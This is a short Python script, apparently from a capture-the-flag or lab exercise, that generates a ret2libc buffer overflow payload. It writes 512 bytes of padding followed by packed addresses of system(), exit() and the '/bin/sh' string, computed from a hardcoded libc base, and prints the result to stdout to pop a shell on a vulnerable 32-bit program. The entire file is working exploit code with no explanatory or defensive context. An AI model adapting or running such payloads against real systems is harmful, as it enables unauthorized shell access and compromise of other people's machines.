

#!/usr/bin/env python3

import struct
import sys


libc_base = 0xf75c2000
system = struct.pack("<I", libc_base + 0x0003a940)
exit = struct.pack("<I", libc_base + 0x0002e7b0)
binsh = struct.pack("<I", libc_base + 0x15900b)

path = b"A" * 512 + system + exit + binsh
sys.stdout.buffer.write(path)

